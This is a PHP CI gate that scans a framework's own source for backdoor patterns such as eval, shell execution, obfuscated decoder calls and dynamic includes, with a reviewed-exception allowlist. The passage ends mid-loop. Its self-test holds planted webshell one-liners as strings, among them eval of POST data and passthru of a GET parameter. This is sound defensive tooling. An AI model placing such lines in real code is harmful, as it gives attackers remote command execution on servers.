<?php

declare(strict_types=1);

/**
 * ASVS V10.1.1 code-integrity gate: refuses first-party PHP that carries the
 * shapes a planted backdoor is made of.
 *
 * 10.1.1 asks for a code-analysis tool "capable of detecting potentially
 * malicious code". `composer audit` is not that tool — it compares installed
 * third-party versions against a CVE feed and never reads a line of first-party
 * source. This gate reads the source. `composer audit` belongs to V14.2, which
 * is where the matrix now cites it, and only there.
 *
 * WHY THE TOKENIZER AND NOT SEMGREP
 *
 * The obvious implementation is a Semgrep rule pack. Measured on this repository
 * with semgrep 1.155.0 and a candidate pack covering every rule below: Semgrep's
 * PHP frontend failed to parse 2064 of the 2579 files under `src/` — 80 %. The
 * two constructs it chokes on are everywhere in this codebase: the `readonly`
 * class modifier (`final readonly class AiResponse`) and a named argument inside
 * an attribute (`#[Api(since: '1.0.0')]`). A parse failure truncates the file at
 * that point, so everything below the attribute is never scanned. The proof is
 * `src/Console/Command/ServeCommand.php`: its `proc_open()` on line 138 sits
 * under `#[Api(since: '1.0.0')]` on line 45, and Semgrep reports nothing there
 * while reporting 91 findings elsewhere. A malicious-code gate blind to four
 * fifths of the code it guards is worse than none, because it reports green.
 * PHP's own tokenizer parses exactly the language this repository is written in,
 * by construction, and cannot fall behind it.
 *
 * WHAT IT REFUSES
 *
 *   eval                    eval(), create_function(), assert('<string>')
 *   shell-command           exec/shell_exec/system/passthru/pcntl_exec, backticks
 *   process-spawn           proc_open(), popen()
 *   unserialize-unbounded   unserialize() of non-literal input with no
 *                           allowed_classes bound
 *   dynamic-include         include/require of superglobal-derived data, of a
 *                           decoder result, or of a stream-wrapper URL
 *   obfuscated-execution    a decoder result invoked as a function, directly or
 *                           through call_user_func
 *   weak-random             rand/mt_rand/srand/mt_srand/lcg_value/uniqid/
 *                           str_shuffle/shuffle/array_rand
 *   preg-replace-eval       preg_replace() with the /e modifier
 *
 * Some of these cannot execute on PHP 8 at all (create_function, /e,
 * assert on a string). They are still refused: a file containing one is
 * evidence of a planted webshell whether or not this runtime would run it.
 *
 * REVIEWED EXCEPTIONS
 *
 * The framework has a number of legitimate process-execution sites — development
 * servers, ffmpeg, protoc, git, and the gates that shell out to other gates.
 * Each is listed in REVIEWED below with an exact finding count. The count is a
 * ratchet in both directions: a new dangerous call in an already-listed file
 * fails the gate, and so does an entry whose findings have since been removed.
 * There is no in-line suppression comment — an exception is a deliberate edit to
 * this file, visible in one place, or it does not exist.
 *
 * SELF-TEST
 *
 * The gate proves its own detector before it trusts it. Every rule carries a
 * planted sample that must be flagged and a benign lookalike that must not be;
 * if any sample fails, the gate exits non-zero without scanning anything. A
 * detector silently stopping to match is the failure mode this whole audit was
 * about, and it is the one failure a scan of clean code cannot reveal. So is a
 * scan that reaches nothing, which is why an empty file list is a failure too.
 *
 * Usage:
 *   php tools/security/assert-no-malicious-code.php
 *   php tools/security/assert-no-malicious-code.php --root=DIR
 *
 * `--root=DIR` scans every PHP file under DIR instead of the framework's own
 * trees, and applies no reviewed exception to what it finds. It exists so the
 * gate's own test (tests/Unit/Integrity/MaliciousCodeGateTest.php) can plant a
 * webshell in a temporary directory and observe the non-zero exit end to end.
 * CI passes no arguments.
 *
 * Exit codes: 0 clean, 1 findings or a failed self-test, 2 bad invocation.
 */

/**
 * Trees that ship or execute. A missing root is a failure, not a skip: a
 * renamed directory must not silently drop out of the scan.
 */
const SCAN_ROOTS = [
    'src',
    'extensions',
    'tests',
    'tools',
    'scripts',
    'bin',
    'public',
    'config',
    // No 'bootstrap': the tree held one file, bootstrap.php, and it now lives at
    // tools/php/bootstrap.php. `tools` is scanned above, so nothing left coverage
    // — which is the only reason this entry may go. The gate refuses to let a
    // root vanish quietly, and it was right to: it caught this the first time it
    // ran, having been unreachable behind an earlier failing step until now.
    'database',
    'benchmarks',
    'examples',
    'lang',
    'resources',
];

/** Directory names never scanned, at any depth. */
const SKIP_DIRECTORIES = ['vendor', 'node_modules', '.git', 'cache'];

/**
 * Rules that apply only to code which ships and runs in production.
 *
 * Weak randomness is a finding when it seeds a security decision. Tests,
 * benchmarks and build tooling call uniqid() to name a temp directory, which
 * decides nothing — scoring those would bury the rule under ~150 non-defects,
 * and a rule nobody reads is a rule nobody enforces. Every other rule keeps the
 * whole-repository scope: a backdoor planted in a test still executes in CI,
 * with CI's credentials.
 */
const RUNTIME_ONLY_RULES = ['weak-random'];

/** Trees that are developed and executed here but never serve a request. */
const NON_RUNTIME_ROOTS = ['tests', 'tools', 'scripts', 'benchmarks'];

/**
 * Reviewed exceptions: path => rule => [count, reason].
 *
 * Every entry was read at the cited line before it was written here. Where a
 * call is safe because the shell is never involved, the reason says so; where it
 * merely is not reachable by an attacker, the reason says that instead. The
 * distinction is the point of the list.
 *
 * @var array<string, array<string, array{count: int, reason: string}>>
 */
const REVIEWED = [
    // --- Development servers: `php -S` behind a console command ---
    'src/Console/Command/ServeCommand.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Starts the development server. Array form, so no shell is involved, and '
                . 'host/port/docroot are validated before the call.',
        ],
    ],
    'extensions/admin/src/Command/AdminServeCommand.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Admin panel development server. Array form ([PHP_BINARY, -S, ...]), so '
                . 'no shell parses the arguments.',
        ],
    ],
    'extensions/cms/src/Command/CmsServeCommand.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'CMS development server. Array form; host is allowlisted and port '
                . 'range-checked above the call.',
        ],
    ],
    'extensions/forum/src/Command/ForumServeCommand.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Forum development server. Array form ([PHP_BINARY, -S, ...]).',
        ],
    ],
    'extensions/studio/src/Command/StudioServeCommand.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'passthru() of a `php -S` command line so the child inherits the terminal. '
                . 'Developer command, not request-reachable: the arguments come from the '
                . 'developer\'s own CLI options. Document root and router script are '
                . 'escapeshellarg()-quoted; --host is interpolated raw, which is a footgun for '
                . 'whoever types it and not an external surface.',
        ],
    ],
    'extensions/studio/src/Server/StudioServer.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'Same `php -S` command line as StudioServeCommand, reached only from a '
                . 'console command; nothing in src/ or extensions/ constructs this class outside '
                . 'its unit test. Document root and router script are escapeshellarg()-quoted.',
        ],
    ],
    'src/View/Command/PlaygroundServeCommand.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'passthru() of the built-in server command line for the local template '
                . 'playground, so the child inherits the terminal. Developer command, not a '
                . 'request-reachable path.',
        ],
    ],
    'extensions/studio/src/Command/StudioOpenCommand.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'exec() of start/open/xdg-open to show Studio in a browser. The only '
                . 'interpolated value is a URL built from configured host and int port, and it '
                . 'is escapeshellarg()-quoted.',
        ],
    ],

    // --- Terminal and external binaries ---
    'src/Console/InteractivePrompt.php' => [
        'process-spawn' => [
            'count' => 2,
            'reason' => 'Toggles terminal echo for hidden password prompts. Both commands are '
                . 'literal `stty` invocations with no interpolation.',
        ],
    ],
    'extensions/cms/src/Media/Document/PdfThumbnailGenerator.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Ghostscript, to render page one of a PDF. Array form; the binary path is '
                . 'server configuration and the PDF path is validated upstream.',
        ],
    ],
    'extensions/cms/src/Media/Video/FfmpegProcess.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'ffmpeg/ffprobe. Array form, and every element is matched against a '
                . 'character-class allowlist (BINARY_PATTERN, PATH_PATTERN, ARG_PATTERN) before '
                . 'the call.',
        ],
    ],
    'extensions/grpc/src/Codegen/OutputValidator.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Runs `php -l` over generated stubs. Array form, fixed argument list.',
        ],
    ],
    'extensions/grpc/src/Codegen/ProtocRunner.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Runs protoc during code generation. Array form; arguments are built by '
                . 'buildArguments() from validated paths.',
        ],
    ],
    'extensions/mcp-server/src/Internal/Subprocess/SubprocessRunner.php' => [
        'process-spawn' => [
            'count' => 2,
            'reason' => 'The MCP tool subprocess and the Windows taskkill that reaps its tree. '
                . 'Both array form. The child environment is an explicit allowlist rather than '
                . 'an inherited getenv(), and McpAccessGate validates path and arguments first.',
        ],
    ],
    'src/SupplyChain/Vex/VexGenerator.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Runs `composer audit --format=json` to build the VEX document. Array '
                . 'form, fixed argument list.',
        ],
    ],

    // --- Studio benchmark runner ---
    'extensions/studio/src/Command/Console/ConsoleBenchmarkCommand.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Spawns the console benchmark child. Array form, argv built in this file.',
        ],
    ],
    'extensions/studio/src/Server/Controller/BenchmarkApiController.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Launches the detached benchmark runner as [PHP_BINARY, $runnerFile]. '
                . 'Array form; the runner file is generated in this method from var_export()ed '
                . 'literals, so the request contributes nothing to either argv or the script.',
        ],
    ],

    // --- Gates that shell out to other gates ---
    'scripts/boundary_check.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Asks git for the changed-file list. Array form, so the CLI-supplied '
                . '--diff-base cannot become a command.',
        ],
    ],
    'scripts/boundary_ratchet.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Reads the previous baseline with `git show`. Array form; replaced an '
                . 'exec() whose Unix-only redirection made the ratchet answer wrongly off CI.',
        ],
    ],
    'scripts/wiring_check.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'exec() of `git diff` for the new-file list. Both interpolated values '
                . 'are escapeshellarg()-quoted; the string form is kept for the `2>/dev/null`.',
        ],
    ],
    'tools/ci/assert-psr4-compliance.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'shell_exec() of a constant `composer dump-autoload --strict-psr` command '
                . 'line. No interpolation at all.',
        ],
    ],
    'tools/bench/run.php' => [
        'shell-command' => [
            'count' => 3,
            'reason' => 'Runs preload:dump, `pulsar optimize`, and the benchmark worker. Every '
                . 'interpolated value — binary, base path, ini flags, worker script — is '
                . 'escapeshellarg()-quoted; the string form is kept for the `2>&1` merge.',
        ],
    ],

    // --- Tests that drive a real process or a real compiler ---
    'tests/Benchmark/Support/MemoryProfileRunner.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Runs a memory scenario in a clean process so the peak is the '
                . 'scenario\'s. Array form, [$phpBinary, $scriptPath].',
        ],
    ],
    'tests/Unit/Tooling/TestYieldGateTest.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Invokes tools/ci/assert-test-yield.php to assert its exit codes. Array '
                . 'form; a gate\'s exit code can only be tested by running it.',
        ],
    ],
    'tests/Unit/Integrity/MaliciousCodeGateTest.php' => [
        'process-spawn' => [
            'count' => 1,
            'reason' => 'Invokes this gate against a fixture tree to assert it exits non-zero on '
                . 'a planted webshell. Array form.',
        ],
    ],
    'tests/Integration/Boundary/DeptracConfigTest.php' => [
        'shell-command' => [
            'count' => 2,
            'reason' => 'Runs `composer boundary:deptrac` and scripts/boundary_check.php to '
                . 'assert they pass. The only interpolated value is the repository root, '
                . 'escapeshellarg()-quoted.',
        ],
    ],
    'tests/Unit/Boundary/BoundaryCheckTest.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'Runs scripts/boundary_check.php --json to assert the output schema. '
                . 'Script path is escapeshellarg()-quoted.',
        ],
    ],
    'tests/Unit/Integrity/DriverDispatchRatchetTest.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'Asks `git grep` which tracked files name a Driver case, deliberately, so '
                . 'scratch files cannot fire the ratchet. Root is escapeshellarg()-quoted.',
        ],
    ],
    'tests/Unit/Integrity/RootCleanlinessTest.php' => [
        'shell-command' => [
            'count' => 1,
            'reason' => 'Asks `git ls-files` what is committed at the repository root, which is '
                . 'the thing the test guards. Root is escapeshellarg()-quoted.',
        ],
    ],
    'tests/Unit/Rendering/StaticSiteGeneratorCoverageTest.php' => [
        'shell-command' => [
            'count' => 2,
            'reason' => 'Platform-appropriate recursive delete of the test\'s own temp directory '
                . '(rmdir /s on Windows, rm -rf elsewhere). The path is sys_get_temp_dir() plus '
                . 'random bytes, escapeshellarg()-quoted.',
        ],
    ],
    'tests/Chaos/CacheFailureTest.php' => [
        'unserialize-unbounded' => [
            'count' => 1,
            'reason' => 'The test feeds deliberately corrupt payloads to unserialize() to assert '
                . 'the caller falls back rather than fataling. Bounding the call with '
                . 'allowed_classes would test a different function than the one under test; the '
                . 'input is five literals defined three lines above.',
        ],
    ],
    'tests/Unit/View/Directive/ForeachDirectiveTest.php' => [
        'eval' => [
            'count' => 2,
            'reason' => 'Executes the directive\'s own compiler output to assert the loop it '
                . 'generates behaves. The evaluated string is a compiler artefact built from a '
                . 'fixed expression literal, never from input.',
        ],
    ],
];

const DECODERS = [
    'base64_decode',
    'gzinflate',
    'gzuncompress',
    'gzdecode',
    'str_rot13',
    'hex2bin',
    'convert_uudecode',
];

const SHELL_FUNCTIONS = ['exec', 'shell_exec', 'system', 'passthru', 'pcntl_exec'];

const SPAWN_FUNCTIONS = ['proc_open', 'popen'];

const WEAK_RANDOM_FUNCTIONS = [
    'rand',
    'mt_rand',
    'srand',
    'mt_srand',
    'lcg_value',
    'uniqid',
    'str_shuffle',
    'shuffle',
    'array_rand',
];

const SUPERGLOBALS = [
    '$_GET',
    '$_POST',
    '$_REQUEST',
    '$_COOKIE',
    '$_FILES',
    '$_SERVER',
    '$_ENV',
    '$GLOBALS',
];

/** Tokens that turn a following name into something other than a global function call. */
const NON_CALL_PREFIXES = [
    T_OBJECT_OPERATOR,
    T_NULLSAFE_OBJECT_OPERATOR,
    T_DOUBLE_COLON,
    T_FUNCTION,
    T_NEW,
    T_CLASS,
    T_INTERFACE,
    T_TRAIT,
    T_ENUM,
    T_ATTRIBUTE,
];

/**
 * Strips whitespace and comments so neighbour lookups are meaningful.
 *
 * @return list<PhpToken>
 */
function significant_tokens(string $source): array
{
    $kept = [];

    foreach (PhpToken::tokenize($source) as $token) {
        if ($token->is([T_WHITESPACE, T_COMMENT, T_DOC_COMMENT])) {
            continue;
        }

        $kept[] = $token;
    }

    return $kept;
}

/**
 * The global function name a token calls, or null when it is not one.
 *
 * `$pdo->exec()`, `Actor::system()` and `function system()` are not calls to
 * the global function; `\exec()` is, and `Foo\exec()` is not.
 *
 * @param list<PhpToken> $tokens
 */
function called_function_name(array $tokens, int $index): ?string
{
    $token = $tokens[$index] ?? null;

    if ($token === null || !$token->is([T_STRING, T_NAME_FULLY_QUALIFIED])) {
        return null;
    }

    if (($tokens[$index + 1] ?? null)?->text !== '(') {
        return null;
    }

    $previous = $tokens[$index - 1] ?? null;

    if ($previous !== null && $previous->is(NON_CALL_PREFIXES)) {
        return null;
    }

    return strtolower(ltrim($token->text, '\\'));
}

/**
 * Token indexes of an argument list, given the index of its opening paren.
 *
 * @param list<PhpToken> $tokens
 *
 * @return array{0: list<PhpToken>, 1: int} the argument tokens and the index of the closing paren
 */
function argument_tokens(array $tokens, int $openIndex): array
{
    $depth = 0;
    $arguments = [];
    $count = count($tokens);

    for ($i = $openIndex; $i < $count; $i++) {
        $text = $tokens[$i]->text;

        if ($text === '(') {
            $depth++;

            if ($depth === 1) {
                continue;
            }
        } elseif ($text === ')') {
            $depth--;

            if ($depth === 0) {
                return [$arguments, $i];
            }
        }

        $arguments[] = $tokens[$i];
    }

    return [$arguments, $count - 1];
}

/**
 * Tokens of an include/require operand, up to the end of the expression.
 *
 * @param list<PhpToken> $tokens
 *
 * @return list<PhpToken>
 */
function operand_tokens(array $tokens, int $startIndex): array
{
    $depth = 0;
    $operand = [];
    $count = count($tokens);

    for ($i = $startIndex + 1; $i < $count; $i++) {
        $text = $tokens[$i]->text;

        if ($text === '(' || $text === '[' || $text === '{') {
            $depth++;
        } elseif ($text === ')' || $text === ']' || $text === '}') {
            if ($depth === 0) {
                break;
            }

            $depth--;
        } elseif ($depth === 0 && ($text === ';' || $text === ',')) {
            break;
        }

        $operand[] = $tokens[$i];
    }

    return $operand;
}

/**
 * True when the token list contains a call to one of the given global functions.
 *
 * @param list<PhpToken> $tokens
 * @param list<string>   $names
 */
function contains_call(array $tokens, array $names): bool
{
    foreach (array_keys($tokens) as $index) {
        $name = called_function_name($tokens, $index);

        if ($name !== null && in_array($name, $names, true)) {
            return true;
        }
    }

    return false;
}

/** The value of a single-quoted or double-quoted literal token. */
function literal_value(PhpToken $token): ?string
{
    if (!$token->is(T_CONSTANT_ENCAPSED_STRING)) {
        return null;
    }

    return substr($token->text, 1, -1);
}

/** True when a preg pattern literal carries the (removed, but incriminating) /e modifier. */
function has_eval_modifier(string $pattern): bool
{
    if ($pattern === '') {
        return false;
    }

    $open = $pattern[0];
    $close = match ($open) {
        '(' => ')',
        '{' => '}',
        '[' => ']',
        '<' => '>',
        default => $open,
    };

    $end = strrpos($pattern, $close);

    if ($end === false || $end === 0) {
        return false;
    }

    return str_contains(substr($pattern, $end + 1), 'e');
}

/**
 * @return list<array{rule: string, line: int, excerpt: string}>
 */
function scan_source(string $source): array
{
    $tokens = significant_tokens($source);
    $lines = preg_split('/\R/', $source) ?: [];
    $findings = [];
    $decoderVariables = [];
    $variableCalls = [];
    $inBacktick = false;
    $count = count($tokens);

    $report = static function (string $rule, int $line) use (&$findings, $lines): void {
        $findings[] = [
            'rule' => $rule,
            'line' => $line,
            'excerpt' => substr(trim($lines[$line - 1] ?? ''), 0, 110),
        ];
    };

    for ($i = 0; $i < $count; $i++) {
        $token = $tokens[$i];

        // Compared by id, not text: a backtick inside a double-quoted string —
        // `"`$column`"`, the MySQL identifier quoting idiom — is
        // T_ENCAPSED_AND_WHITESPACE whose text is also a backtick.
        if ($token->id === ord('`')) {
            // Backticks come in pairs; report the command, not both delimiters.
            if (!$inBacktick) {
                $report('shell-command', $token->line);
            }

            $inBacktick = !$inBacktick;

            continue;
        }

        // `public function eval(...)` is a legal method name since PHP 7, and the
        // tokenizer still calls it T_EVAL. Only the construct counts.
        if ($token->is(T_EVAL) && !($tokens[$i - 1] ?? null)?->is(NON_CALL_PREFIXES)) {
            $report('eval', $token->line);

            continue;
        }

        if ($token->is([T_INCLUDE, T_INCLUDE_ONCE, T_REQUIRE, T_REQUIRE_ONCE])) {
            $operand = operand_tokens($tokens, $i);
            $dangerous = contains_call($operand, DECODERS);

            foreach ($operand as $operandToken) {
                if ($operandToken->is(T_VARIABLE) && in_array($operandToken->text, SUPERGLOBALS, true)) {
                    $dangerous = true;
                }

                $literal = literal_value($operandToken);

                if ($literal !== null && preg_match('#^[a-z][a-z0-9+.\-]*://#i', $literal) === 1) {
                    $dangerous = true;
                }
            }

            if ($dangerous) {
                $report('dynamic-include', $token->line);
            }

            continue;
        }

        // `$handler = base64_decode($blob);` followed anywhere by `$handler(...)`.
        if ($token->is(T_VARIABLE)) {
            if (($tokens[$i + 1] ?? null)?->text === '=' && called_function_name($tokens, $i + 2) !== null
                && in_array(called_function_name($tokens, $i + 2), DECODERS, true)) {
                $decoderVariables[$token->text] = true;
            }

            if (($tokens[$i + 1] ?? null)?->text === '(') {
                $variableCalls[] = [$token->text, $token->line];
            }
        }

        $name = called_function_name($tokens, $i);

        if ($name === null) {
            continue;
        }

        if (in_array($name, SHELL_FUNCTIONS, true)) {
            $report('shell-command', $token->line);

            continue;
        }

        if (in_array($name, SPAWN_FUNCTIONS, true)) {
            $report('process-spawn', $token->line);

            continue;
        }

        if ($name === 'create_function') {
            $report('eval', $token->line);

            continue;
        }

        if (in_array($name, WEAK_RANDOM_FUNCTIONS, true)) {
            $report('weak-random', $token->line);

            continue;
        }

        if ($name === 'assert') {
            [$arguments] = argument_tokens($tokens, $i + 1);

            if (count($arguments) === 1 && literal_value($arguments[0]) !== null) {
                $report('eval', $token->line);
            }

            continue;
        }

        if ($name === 'unserialize') {
            [$arguments] = argument_tokens($tokens, $i + 1);
            $bounded = false;

            foreach ($arguments as $argument) {
                if (str_contains($argument->text, 'allowed_classes')) {
                    $bounded = true;
                }
            }

            $literalOnly = count($arguments) === 1 && literal_value($arguments[0]) !== null;

            if (!$bounded && !$literalOnly) {
                $report('unserialize-unbounded', $token->line);
            }

            continue;
        }

        if ($name === 'preg_replace') {
            [$arguments] = argument_tokens($tokens, $i + 1);
            $pattern = $arguments === [] ? null : literal_value($arguments[0]);

            if ($pattern !== null && has_eval_modifier($pattern)) {
                $report('preg-replace-eval', $token->line);
            }

            continue;
        }

        if ($name === 'call_user_func' || $name === 'call_user_func_array') {
            [$arguments] = argument_tokens($tokens, $i + 1);

            if (contains_call($arguments, DECODERS)) {
                $report('obfuscated-execution', $token->line);
            }
        }
    }

    foreach ($variableCalls as [$variable, $line]) {
        if (isset($decoderVariables[$variable])) {
            $report('obfuscated-execution', $line);
        }
    }

    usort($findings, static fn(array $a, array $b): int => $a['line'] <=> $b['line']);

    return $findings;
}

/**
 * Planted samples the detector must flag, and lookalikes it must not.
 *
 * @return list<string> failures
 */
function self_test(): array
{
    $mustFlag = [
        'eval' => '<?php @eval($_POST["c"]);',
        'eval (create_function)' => '<?php $f = create_function("$a", "return $a;");',
        'eval (assert on a string)' => '<?php assert("1 === 1");',
        'shell-command' => '<?php passthru($_GET["cmd"]);',
        'shell-command (backticks)' => '<?php $out = `id`;',
        'shell-command (fully qualified)' => '<?php \exec($cmd);',
        'process-spawn' => '<?php proc_open($cmd, [], $pipes);',
        'unserialize-unbounded' => '<?php $o = unserialize($_COOKIE["s"]);',
        'dynamic-include (superglobal)' => '<?php include $_GET["page"];',
        'dynamic-include (decoder)' => '<?php require base64_decode($blob);',
        'dynamic-include (wrapper)' => '<?php include "http://example.invalid/x.txt";',
        'obfuscated-execution (variable call)' => '<?php $h = base64_decode($b); $h($argv);',
        'obfuscated-execution (call_user_func)' => '<?php call_user_func(base64_decode($b), 1);',
        'weak-random' => '<?php $token = mt_rand(0, PHP_INT_MAX);',
        'preg-replace-eval' => '<?php preg_replace("/(.*)/e", "system(\'$1\')", $in);',
    ];

    $expectedRules = [
        'eval' => 'eval',
        'eval (create_function)' => 'eval',
        'eval (assert on a string)' => 'eval',
        'shell-command' => 'shell-command',
        'shell-command (backticks)' => 'shell-command',
        'shell-command (fully qualified)' => 'shell-command',
        'process-spawn' => 'process-spawn',
        'unserialize-unbounded' => 'unserialize-unbounded',
        'dynamic-include (superglobal)' => 'dynamic-include',
        'dynamic-include (decoder)' => 'dynamic-include',
        'dynamic-include (wrapper)' => 'dynamic-include',
        'obfuscated-execution (variable call)' => 'obfuscated-execution',
        'obfuscated-execution (call_user_func)' => 'obfuscated-execution',
        'weak-random' => 'weak-random',
        'preg-replace-eval' => 'preg-replace-eval',
    ];

    $mustNotFlag = [
        'method named exec' => '<?php $pdo->exec("SELECT 1");',
        'nullsafe method named eval' => '<?php $redis?->eval($lua, $keys, 2);',
        'static method named system' => '<?php AuditActor::system("mail.webhook");',
        'method declaration named system' => '<?php class A { public function system(string $s): void {} }',
        'namespaced function named exec' => '<?php Vendor\Process\exec($cmd);',
        'enum named Rand' => '<?php enum Rand { case One; }',
        'bounded unserialize' => '<?php unserialize($raw, ["allowed_classes" => false]);',
        'unserialize of a literal' => '<?php unserialize("a:0:{}");',
        'resolved path require' => '<?php $config = require __DIR__ . "/config.php";',
        'template include of a local path' => '<?php include $compiledTemplatePath;',
        'CSPRNG' => '<?php $n = random_int(0, 10); $b = random_bytes(32);',
        'backticks inside a docblock' => "<?php\n/** Mentions `code spans` in prose. */\n\$x = 1;",
        'preg_replace without /e' => '<?php preg_replace("/\s+/u", " ", $in);',
        'named argument called system' => '<?php configure(system: true);',
    ];

    $failures = [];

    foreach ($mustFlag as $label => $sample) {
        $rules = array_column(scan_source($sample), 'rule');

        if (!in_array($expectedRules[$label], $rules, true)) {
            $failures[] = sprintf(
                'planted sample "%s" was NOT flagged as %s (got: %s)',
                $label,
                $expectedRules[$label],
                $rules === [] ? 'nothing' : implode(', ', $rules),
            );
        }
    }

    foreach ($mustNotFlag as $label => $sample) {
        $rules = array_column(scan_source($sample), 'rule');

        if ($rules !== []) {
            $failures[] = sprintf(
                'benign sample "%s" was flagged as %s',
                $label,
                implode(', ', $rules),
            );
        }
    }

    return $failures;
}

/** Whether a rule is in force for a repository-relative path. */
function rule_applies(string $rule, string $relative): bool
{
    if (!in_array($rule, RUNTIME_ONLY_RULES, true)) {
        return true;
    }

    $top = strstr($relative, '/', true);

    if ($top !== false && in_array($top, NON_RUNTIME_ROOTS, true)) {
        return false;
    }

    return preg_match('#^extensions/[^/]+/tests/#', $relative) !== 1;
}

/**
 * Every PHP file under one tree, repository-relative, POSIX separators.
 *
 * @return list<string>
 */
function php_files_under(string $root, string $tree): array
{
    $files = [];

    $iterator = new RecursiveIteratorIterator(
        new RecursiveCallbackFilterIterator(
            new RecursiveDirectoryIterator($tree, FilesystemIterator::SKIP_DOTS),
            static fn(SplFileInfo $file): bool => !$file->isDir()
                || !in_array($file->getFilename(), SKIP_DIRECTORIES, true),
        ),
    );

    foreach ($iterator as $file) {
        if (!$file instanceof SplFileInfo || !$file->isFile()) {
            continue;
        }

        $path = str_replace('\\', '/', $file->getPathname());
        $extension = strtolower($file->getExtension());

        // bin/pulsar and friends carry a shebang instead of an extension.
        if ($extension !== 'php' && $extension !== 'phtml') {
            $handle = fopen($file->getPathname(), 'rb');

            if ($handle === false) {
                continue;
            }

            $head = (string) fread($handle, 64);
            fclose($handle);

            if ($extension !== '' || !str_contains($head, '<?php')) {
                continue;
            }
        }

        $files[] = substr($path, strlen($root) + 1);
    }

    return $files;
}

/**
 * @param list<string>|null $scanRoots null scans the root itself as a single tree
 *
 * @return list<string> repository-relative paths, POSIX separators
 */
function php_files(string $root, ?array $scanRoots): array
{
    if ($scanRoots === null) {
        $files = php_files_under($root, $root);
        sort($files);

        return $files;
    }

    $files = [];

    foreach ($scanRoots as $scanRoot) {
        $absolute = $root . '/' . $scanRoot;

        if (!is_dir($absolute)) {
            fwrite(STDERR, sprintf(
                "FAIL: scan root '%s' does not exist.\n\n"
                . "The gate scans an explicit list of trees so that a new one cannot appear\n"
                . "unscanned. A root that has been renamed or removed must be corrected in\n"
                . "SCAN_ROOTS, deliberately — it is not allowed to drop out silently.\n",
                $scanRoot,
            ));

            exit(2);
        }

        foreach (php_files_under($root, $absolute) as $file) {
            $files[] = $file;
        }
    }

    sort($files);

    return $files;
}

/** @var list<string> $arguments */
$arguments = array_values(array_filter($argv ?? [], 'is_string'));
array_shift($arguments);

$fixtureRoot = null;

foreach ($arguments as $argument) {
    if (str_starts_with($argument, '--root=')) {
        $candidate = realpath(substr($argument, strlen('--root=')));

        if ($candidate === false || !is_dir($candidate)) {
            fwrite(STDERR, sprintf("FAIL: --root is not a directory: %s\n", $argument));

            exit(2);
        }

        $fixtureRoot = rtrim(str_replace('\\', '/', $candidate), '/');

        continue;
    }

    fwrite(STDERR, sprintf(
        "FAIL: unknown argument '%s'.\n\nUsage: php %s [--root=DIR]\n",
        $argument,
        basename(__FILE__),
    ));

    exit(2);
}

$root = $fixtureRoot ?? str_replace('\\', '/', dirname(__DIR__, 2));

// A fixture tree is not the framework, so no reviewed exception describes it and
// none is applied: everything found there is unexpected, which is what makes the
// gate's own test a proof rather than a re-run of the allowlist.
$reviewed = $fixtureRoot === null ? REVIEWED : [];

$selfTestFailures = self_test();

if ($selfTestFailures !== []) {
    fwrite(STDERR, "FAIL: the malicious-code detector does not detect what it claims.\n\n");

    foreach ($selfTestFailures as $failure) {
        fwrite(STDERR, '  - ' . $failure . "\n");
    }

    fwrite(STDERR, "\nNo files were scanned. Fix scan_source() before trusting any result.\n");

    exit(1);
}

/** @var array<string, array<string, list<array{rule: string, line: int, excerpt: string}>>> $byFile */
$byFile = [];
$scanned = 0;

foreach (php_files($root, $fixtureRoot === null ? SCAN_ROOTS : null) as $relative) {
    $source = file_get_contents($root . '/' . $relative);

    if ($source === false) {
        fwrite(STDERR, sprintf("FAIL: could not read %s\n", $relative));

        exit(2);
    }

    $scanned++;

    foreach (scan_source($source) as $finding) {
        if (!rule_applies($finding['rule'], $relative)) {
            continue;
        }

        $byFile[$relative][$finding['rule']][] = $finding;
    }
}

// "Clean" and "reached nothing" print the same reassuring line otherwise, and
// the second is how a gate stops guarding without anyone noticing.
if ($scanned === 0) {
    fwrite(STDERR, "FAIL: the scan matched no PHP files at all.\n\n"
        . "A gate that reads nothing reports the same success as a gate that reads\n"
        . "everything. Check the root and SCAN_ROOTS before believing a pass.\n");

    exit(2);
}

$unexpected = [];
$staleAllowances = [];

foreach ($byFile as $relative => $byRule) {
    foreach ($byRule as $rule => $findings) {
        $allowed = $reviewed[$relative][$rule]['count'] ?? 0;

        if (count($findings) > $allowed) {
            $unexpected[$relative][$rule] = array_slice($findings, $allowed);
        }
    }
}

foreach ($reviewed as $relative => $byRule) {
    foreach ($byRule as $rule => $allowance) {
        $found = count($byFile[$relative][$rule] ?? []);

        if ($found < $allowance['count']) {
            $staleAllowances[] = sprintf(
                '%s: %s allows %d finding(s), %d present',
                $relative,
                $rule,
                $allowance['count'],
                $found,
            );
        }
    }
}

printf("Scanned %d PHP files.\n", $scanned);

if ($unexpected === [] && $staleAllowances === []) {
    printf("No malicious-code patterns outside the %d reviewed files.\n", count($reviewed));

    exit(0);
}

if ($unexpected !== []) {
    fwrite(STDERR, "\nFAIL: malicious-code patterns with no reviewed exception.\n\n");

    foreach ($unexpected as $relative => $byRule) {
        foreach ($byRule as $rule => $findings) {
            foreach ($findings as $finding) {
                fwrite(STDERR, sprintf(
                    "  %s:%d  [%s]  %s\n",
                    $relative,
                    $finding['line'],
                    $rule,
                    $finding['excerpt'],
                ));
